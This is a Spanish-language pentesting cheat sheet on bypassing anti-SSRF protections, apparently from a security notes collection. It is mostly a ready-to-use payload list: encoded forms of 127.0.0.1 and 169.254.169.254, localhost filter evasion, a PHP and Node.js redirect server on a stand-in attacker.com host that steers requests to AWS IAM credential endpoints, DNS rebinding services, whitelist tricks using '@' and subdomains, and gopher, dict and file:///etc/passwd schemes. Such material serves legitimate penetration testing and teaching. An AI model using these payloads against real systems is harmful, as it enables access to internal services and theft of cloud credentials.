# Bypass

## Tipos de protecciones anti-SSRF

```
1. Blacklist de IPs           → bloquear 127.0.0.1, 169.254.x.x, 192.168.x.x...
2. Blacklist de dominios      → bloquear "localhost", "metadata", "internal"...
3. Whitelist de dominios      → solo permitir ciertos dominios
4. Validación de esquema      → solo permitir http:// y https://
5. Resolución DNS previa      → resolver la IP antes y verificarla
6. Timeout muy corto          → no da tiempo a conectar a servicios lentos
7. WAF                        → detectar patrones conocidos de SSRF
```

Cada protección tiene sus bypasses específicos.

### Bypass de blacklist de IPs

#### Representaciones alternativas de 127.0.0.1

```bash
# Decimal (el más obvio — normalmente bloqueado)
http://127.0.0.1/

# Decimal completo (DWORD — una sola cifra)
http://2130706433/
# 127*256^3 + 0*256^2 + 0*256 + 1 = 2130706433

# Hexadecimal
http://0x7f000001/
http://0x7f.0x0.0x0.0x1/

# Octal
http://0177.0.0.1/
http://0177.0000.0000.0001/

# IPv6 loopback
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
http://[0000:0000:0000:0000:0000:0000:0000:0001]/

# IPv6 mapped IPv4
http://[::ffff:127.0.0.1]/
http://[::ffff:7f00:1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/

# Formas cortas de IPv4
http://127.1/               # Solo dos octetos
http://127.0.1/
http://0/                   # 0 = 0.0.0.0 en algunos sistemas
http://0.0.0.0/

# Con ceros adicionales (leading zeros)
http://127.000.000.001/
http://0127.0.0.1/          # Primer octeto en octal

# Carácteres especiales en la IP
http://127.0.0.1%00/        # Null byte al final (truncar)
http://127.0.0.1.nip.io/    # Servicio DNS que resuelve a la IP indicada
http://127.0.0.1.xip.io/    # Similar
```

#### Representaciones alternativas de 169.254.169.254 (metadata AWS)

```bash
# Decimal (DWORD)
http://2852039166/
# 169*256^3 + 254*256^2 + 169*256 + 254 = 2852039166

# Hexadecimal
http://0xa9fea9fe/
http://0xa9.0xfe.0xa9.0xfe/

# Octal
http://0251.0376.0251.0376/

# IPv6 mapped
http://[::ffff:169.254.169.254]/
http://[::ffff:a9fe:a9fe]/

# Servicios DNS que resuelven a la IP
http://169.254.169.254.nip.io/         # Devuelve A 169.254.169.254
http://169.254.169.254.traefik.me/     # Similar
```

### Bypass de blacklist de palabras

#### Bypass de "localhost"

```bash
# Equivalentes a localhost
http://LOCALHOST/           # Mayúsculas
http://LocalHost/           # Mezcla
http://localtest.me/        # DNS que resuelve a 127.0.0.1
http://lvh.me/              # También resuelve a 127.0.0.1
http://127.0.0.1.nip.io/
http://spoofed.burpcollaborator.net/  # Si el dominio del colaborator resuelve a 127.0.0.1

# Subdominio que resuelve a localhost
http://attacker.com/   → con DNS: attacker.com → 127.0.0.1
# Registrar propio dominio con A record apuntando a 127.0.0.1
```

#### Bypass de "169.254.169.254"

```bash
# Servicio cloud con CNAME hacia metadata
# En algunos proveedores hay alias
http://metadata/                # AWS ECS
http://metadata.internal/       # GCP legacy
http://169.254.169.254.nip.io/

# Variables de entorno que apuntan al metadata (dentro del servicio)
# AWS_METADATA_SERVICE_ENDPOINT
# GCE_METADATA_HOST
```

### Bypass mediante redirección (Open Redirect)

Si el servidor sigue redirecciones HTTP, se puede usar un servidor propio que redirija a la IP interna objetivo. La validación ocurre en la URL inicial (dominio permitido), pero la petición real va a la dirección interna.

```bash
# Esquema básico:
# 1. Crear página en servidor controlado que redirija:
#    301/302 Location: http://127.0.0.1/admin

# Contenido de redirect.php en attacker.com:
<?php
header("Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/");
exit();
?>

# 2. Payload SSRF:
url=http://attacker.com/redirect.php
# → La app valida "attacker.com" (permitido) pero sigue la redirección al metadata

# Redirección con distintos status codes:
# 301 Moved Permanently
# 302 Found (el más usado)
# 303 See Other
# 307 Temporary Redirect (conserva el método HTTP)
# 308 Permanent Redirect (conserva el método HTTP)

# Con Node.js (más flexible):
const http = require('http');
http.createServer((req, res) => {
    res.writeHead(302, {'Location': 'http://127.0.0.1:8080/admin'});
    res.end();
}).listen(80);
```

#### Open Redirect en la propia app

```bash
# Si la app tiene un endpoint de redirección propio:
https://target.com/redirect?url=http://attacker.com
# → Y luego SSRF apunta al redirect interno de la misma app

# Ejemplo:
url=https://target.com/goto?url=http://169.254.169.254/latest/meta-data/
# La validación ve "target.com" (dominio de la app), permite la petición
# El redirect interno lleva al metadata endpoint
```

### DNS Rebinding

DNS Rebinding es el bypass más sofisticado. Permite evadir protecciones que resuelven el DNS antes de conectar.

#### Cómo funciona

```
Protección a evadir:
1. App recibe URL con dominio
2. Resuelve DNS → obtiene IP
3. Verifica que la IP no está en blacklist
4. Si está permitida → hace la petición

DNS Rebinding:
1. App recibe URL con dominio controlado por atacante
2. Primera resolución DNS → devuelve IP pública (permitida)
3. App verifica: "✅ IP pública, no en blacklist"
4. Entre la verificación y la conexión → TTL expira
5. Segunda resolución DNS → ahora devuelve 127.0.0.1
6. La petición llega a localhost
```

#### Implementación

```bash
# Necesitas: dominio propio + servidor DNS autoritativo

# Configurar DNS con TTL=0:
# attacker.com → primera respuesta: 1.2.3.4 (IP real)
# attacker.com → segunda respuesta: 127.0.0.1 (IP interna)

# Herramientas:
# singularity (DNS rebinding toolkit)
git clone https://github.com/nccgroup/singularity.git
# Permite configurar el "rebind" desde una interfaz web

# rbndr.us (servicio online de DNS rebinding para testing)
# Formato: EXTERNAL_IP.INTERNAL_IP.rbndr.us
# Ejemplo:
http://1-2-3-4.127-0-0-1.rbndr.us/
# → Alterna entre 1.2.3.4 y 127.0.0.1

# whonow (DNS rebinding via wildcard)
# http://make-1.2.3.4-rebind-127.0.0.1-once.1u.ms/
```

### Bypass de whitelist

Si solo se permiten ciertos dominios, hay técnicas para hacer que la URL "parezca" del dominio permitido:

#### Credenciales en la URL

```bash
# La URL http://user@host/path → user es el usuario de autenticación HTTP
# La URL http://allowed.com@attacker.com/ → algunos parsers interpretan
#   - allowed.com como credencial/usuario
#   - attacker.com como el host real

# Varios formatos:
http://allowed.com@127.0.0.1/           # allowed.com como user
http://allowed.com:anything@127.0.0.1/  # allowed.com:anything como user:pass
https://allowed.com@127.0.0.1:443/

# Encodings del @:
http://allowed.com%40127.0.0.1/         # %40 = @
http://allowed.com%2540127.0.0.1/       # Double encoded
```

#### Subdominio del dominio permitido

```bash
# Si la whitelist verifica que la URL "contiene" el dominio permitido:
http://allowed.com.attacker.com/   # attacker.com con subdominio de allowed.com
http://attacker.com?allowed.com    # Query string con el dominio permitido
http://attacker.com#allowed.com    # Fragment con el dominio permitido
http://attacker.com/allowed.com    # Path con el dominio permitido

# Si la whitelist verifica que la URL "empieza por" el dominio:
http://allowed.com.attacker.com/
http://allowed.com@attacker.com/
```

#### Path traversal en URL

```bash
# Si la whitelist verifica el host pero no el path completo:
http://allowed.com/../../etc/passwd   # Path traversal
http://allowed.com#@127.0.0.1/       # Confusión del parser con #
```

### Bypass via inconsistencias en el parser de URLs

Distintas librerías parsean URLs de forma ligeramente diferente. Lo que el validador interpreta como dominio puede diferir de lo que la librería de red usa.

```bash
# Diferencias entre parsers:
# urllib3 vs requests vs urlparse en Python tienen pequeñas diferencias

# Slash antes del host:
http:///127.0.0.1/          # Tres slashes
http:////127.0.0.1/         # Cuatro slashes

# Backslash como separador (Windows / algunos parsers):
http://127.0.0.1\@allowed.com/
http://127.0.0.1\allowed.com/

# Caracteres especiales en el host:
http://127.0.0.1%09/        # Tab en el host
http://127.0.0.1%20/        # Espacio
http://[127.0.0.1]/         # Corchetes (IPv6 notation pero con IPv4)

# Puertos no estándar que algunos validadores ignoran:
http://127.0.0.1:443/       # Puerto 443 pero a localhost
http://127.0.0.1:80@allowed.com/

# Unicode normalization:
http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/  # Caracteres unicode que normalizan a "localhost"
```

### Bypass de validación DNS (Time-of-check Time-of-use)

```bash
# Si el servidor:
# 1. Resuelve la IP del dominio
# 2. Comprueba la IP contra blacklist
# 3. Hace la petición HTTP (usando la IP resuelta en paso 1 O resolviendo de nuevo)
#
# Si el paso 3 resuelve de nuevo el DNS → DNS Rebinding funciona
# Si el paso 3 usa la IP del paso 1 → DNS Rebinding NO funciona

# Herramienta para detectar si usa la IP del paso 1 o resuelve de nuevo:
# Configurar DNS con TTL=0 que devuelva IPs alternantes
# Si la petición llega a ambas IPs → resuelve dos veces → vulnerable a DNS Rebinding
```

### Bypass de esquemas

```bash
# Si solo se permite http:// y https://, probar:
HTTP://127.0.0.1/           # Mayúsculas
hTtP://127.0.0.1/           # Mezcla
http:/127.0.0.1/            # Un solo slash (algunos parsers lo aceptan)

# Si hay una lista de esquemas permitidos pero no exhaustiva:
http://127.0.0.1/
https://127.0.0.1/
# → Intentar otros que el servidor pueda soportar aunque no estén en la whitelist:
ftp://127.0.0.1/
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_INFO
file:///etc/passwd
```

### Bypass de validación con caracteres especiales

```bash
# URL encoding parcial
http://%31%32%37%2e%30%2e%30%2e%31/   # "127.0.0.1" URL encoded
http://127.0.0.1%2f                    # Slash final encoded

# Double URL encoding
http://%2531%2532%2537%2e%2530%2e%2530%2e%2531/

# Inyección de caracteres de control
http://127.0.0.1%00/                  # Null byte
http://127.0.0.1%0d%0a/              # CRLF
http://127.0.0.1%09/                 # Tab horizontal

# IPs con notación mixta
http://127.0x000001/                 # Primer octeto decimal, último hex
http://0x7f.0.0.01/                 # Primer y último distintos
```

### Detectar qué filtro está activo

```bash
# Metodología para mapear los filtros antes de elegir bypass:

# 1. Probar con Burp Collaborator para confirmar que el servidor HACE peticiones
url=http://COLLABORATOR_URL → ¿Llega petición? → SSRF existe

# 2. Probar IP directa de localhost
url=http://127.0.0.1/ → ¿Bloqueado?
→ Sí: hay filtro de IP → probar representaciones alternativas

# 3. Probar la palabra "localhost"
url=http://localhost/ → ¿Bloqueado?
→ Sí: hay filtro de dominio → probar mayúsculas, servicios DNS

# 4. Probar con IP decimal/hex
url=http://2130706433/ → ¿Bloqueado?
→ Sí: el filtro normaliza IPs antes de comparar

# 5. Probar open redirect
url=http://trusted-domain.com/redirect?to=http://127.0.0.1/
→ ¿Sigue la redirección? → bypass via redirect

# 6. Probar DNS rebinding con rbndr.us
url=http://1-2-3-4.127-0-0-1.rbndr.us/
→ ¿Funciona? → vulnerable a DNS rebinding
```

### Tabla de bypasses por tipo de filtro

| Filtro                        | Bypass más efectivo                                                       |
| ----------------------------- | ------------------------------------------------------------------------- |
| Blacklist `127.0.0.1`         | Decimal `2130706433`, `0x7f000001`, `[::1]`                               |
| Blacklist `169.254.169.254`   | Decimal `2852039166`, `0xa9fea9fe`, `0251.0376.0251.0376`                 |
| Blacklist `localhost`         | `LOCALHOST`, `127.0.0.1.nip.io`, `localtest.me`                           |
| Solo dominios permitidos      | `permitted.com@127.0.0.1`, subdominio `127.0.0.1.permitted.com`           |
| Resolución DNS + verificación | DNS Rebinding, `rbndr.us`                                                 |
| Verificar antes de conectar   | Open Redirect desde dominio permitido                                     |
| Solo `http://` y `https://`   | `gopher://`, `dict://`, `file://` (si no están explicitamente bloqueados) |
| Filtro en URL completa        | `http://127.0.0.1#allowed.com`, `http://[::ffff:127.0.0.1]`               |

> El bypass más fiable en la práctica es el open redirect: si la app SSRF permite cualquier dominio pero hace seguimiento de redirecciones, y hay un open redirect en algún endpoint, se puede encadenar para llegar a cualquier IP.

> Antes de intentar bypasses complejos, probar las representaciones numéricas de la IP: `http://2130706433/` (decimal de 127.0.0.1) y `http://0xa9fea9fe/` (hex de 169.254.169.254) bypass la mayoría de filtros simples de blacklist de strings.

> DNS Rebinding requiere infraestructura propia (dominio + servidor DNS) y depende del timing. En pentests con tiempo limitado, priorizar los bypasses más rápidos de probar (representaciones alternativas de IP, open redirects) antes de montar la infraestructura de rebinding.
